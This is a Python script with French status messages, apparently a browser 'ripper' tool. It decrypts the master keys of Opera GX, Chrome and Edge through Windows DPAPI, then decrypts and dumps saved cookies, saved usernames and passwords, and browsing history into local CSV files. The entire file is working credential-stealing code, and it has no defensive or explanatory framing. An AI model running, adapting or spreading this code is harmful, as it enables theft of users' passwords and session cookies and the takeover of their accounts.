#Coded by BiMathAx 02.05.2022

import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES



def get_master_key(path_to_localstate):
    file_path = os.environ["USERPROFILE"] + os.sep + path_to_localstate
    file = open(file_path,'r',encoding="utf-8")
    data = json.loads(file.read())
    file.close()
    b64_key = data["os_crypt"]["encrypted_key"]
    encrypted_key = base64.b64decode(b64_key)[5:] #Supp b'DPAPI\
    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return master_key

def get_cookie(master_key, path_to_db, sql):
    file_path = os.environ["USERPROFILE"] + os.sep + path_to_db
    db = sqlite3.connect(file_path)
    db.text_factory = bytes
    cursor = db.cursor()
    cursor.execute(sql)
    
    data = cursor.fetchall()
    ls=["Site;Nom Cookie;Valeur"]
    for c in data:
        value = decrypt_cookie(c[2],master_key)
        ls.append(f"{c[0].decode()};{c[1].decode()};{value}")
    #--------
    cursor.close()
    return ls
    
def decrypt_cookie(cookie, key):
    if cookie[:3] == b'v10': 
        cookie = cookie[3:] #Remove v10
        iv = cookie[:12]
        payload = cookie[12:]
        crypteur = AES.new(key, AES.MODE_GCM, iv)
        data = crypteur.decrypt(payload)[:-16] #Remove suffix byte
        return data.decode()
    else :
        return win32crypt.CryptUnprotectData(cookie)[1].decode()

def get_history(path):
    file_path = os.environ["USERPROFILE"] + os.sep + path
    db = sqlite3.connect(file_path)
    db.text_factory = bytes
    cursor = db.cursor()
    cursor.execute("SELECT title, url, visit_count FROM urls;")
    data = cursor.fetchall()
    ls=["title;url;visit_count"]
    for h in data :
        ls.append(f"{h[0].decode()};{h[1].decode()};{h[2]}")
    db.close()
    return ls
    

MASTER_KEY = [ r"AppData\Roaming\Opera Software\Opera GX Stable\Local State",
               r"AppData\Local\Google\Chrome\User Data\Local State",
               r"AppData\Local\Microsoft\Edge\User Data\Local State" ]

COOKIES = [ r"AppData\Roaming\Opera Software\Opera GX Stable\Network\Cookies",   #Opera
            r"AppData\Local\Google\Chrome\User Data\Default\Network\Cookies",    #Chrome
            r"AppData\Local\Microsoft\Edge\User Data\Default\Network\Cookies" ]  #Edge

PASSWORD = [ r"AppData\Roaming\Opera Software\Opera GX Stable\Login Data",
             r"AppData\Local\Google\Chrome\User Data\Default\Login Data",
             r"AppData\Local\Microsoft\Edge\User Data\Default\Login Data" ]

HISTORY = [ r"AppData\Roaming\Opera Software\Opera GX Stable\History",
             r"AppData\Local\Google\Chrome\User Data\Default\History",
             r"AppData\Local\Microsoft\Edge\User Data\Default\History" ]

SQL = [ "SELECT host_key, name, encrypted_value FROM cookies;",            #Cookies
        "SELECT origin_url, username_value, password_value FROM logins;"]  #Login Data

#print(get_history(HISTORY[0]))

def main():
    if "result_ripper" not in os.listdir():
        os.mkdir("result_ripper")
    print("-- Récupération des masters keys --")
    master_key = []
    t=0
    for i in ["Opera GX", "Chrome", "Edge"]:
        try :
            key = get_master_key(MASTER_KEY[t])
            master_key.append(key)
            print(i,"SUCCESS")
        except:
            master_key.append("")
            print(i,"Error")
        t+=1

    print("\n-- Récupération des Cookies --")
    cookies = [[],[],[]]
    t=0
    for i in ["Opera GX", "Chrome", "Edge"]:
        if master_key[t] != "":
            try :
                cookies[t] = get_cookie(master_key[t], COOKIES[t], SQL[0])
                print(i,"SUCCESS")
            except Exception as e :
                print(i,"Error")
        else :
            print(i,"Error")
        t += 1
    
    print("\n-- Récupération des Logins --")
    password = [[],[],[]]
    t=0
    for i in ["Opera GX", "Chrome", "Edge"]:
        if master_key[t] != "":
            try :
                password[t] = get_cookie(master_key[t], PASSWORD[t], SQL[1])
                print(i,"SUCCESS")
            except Exception as e :
                print(i,"Error")
        else :
            print(i,"Error")
        t += 1

    print("\n-- Récupération des Historiques --")
    history = [[],[],[]]
    t=0
    for i in ["Opera GX", "Chrome", "Edge"]:
        if master_key[t] != "":
            try :
                history[t] = get_history(HISTORY[t])
                print(i,"SUCCESS")
            except :
                print(i,"Error")
        else :
            print(i,"Error")
        t += 1

    print("\n-- Save Result --")
    t=0
    for i in ["Opera GX", "Chrome", "Edge"]:
        try :
            if cookies[t] != [] :
                file = open(f"result_ripper/{i}_cookies.csv","w")
                file.write("\n".join(cookies[t]))
                file.close()
                print(i,"Cookies SUCCESS")
            else :
                print(i,"Cookies Error")
        except:
            print(i,"Cookies Error")
        t+=1
    t=0
    for i in ["Opera GX", "Chrome", "Edge"]:
        try :
            if password[t] != [] :
                file = open(f"result_ripper/{i}_login.csv","w")
                file.write("\n".join(password[t]))
                file.close()
                print(i,"Login SUCCESS")
            else :
                print(i,"Login Error")
        except:
            print(i,"Login Error")
        t+=1
    t=0
    for i in ["Opera GX", "Chrome", "Edge"]:
        try :
            if history[t] != [] :
                file = open(f"result_ripper/{i}_history.csv","w")
                file.write("\n".join(history[t]))
                file.close()
                print(i,"History SUCCESS")
            else :
                print(i,"History Error")
        except:
            print(i,"History Error")
        t+=1
    print("-- END --")

if __name__ == "__main__":
    main()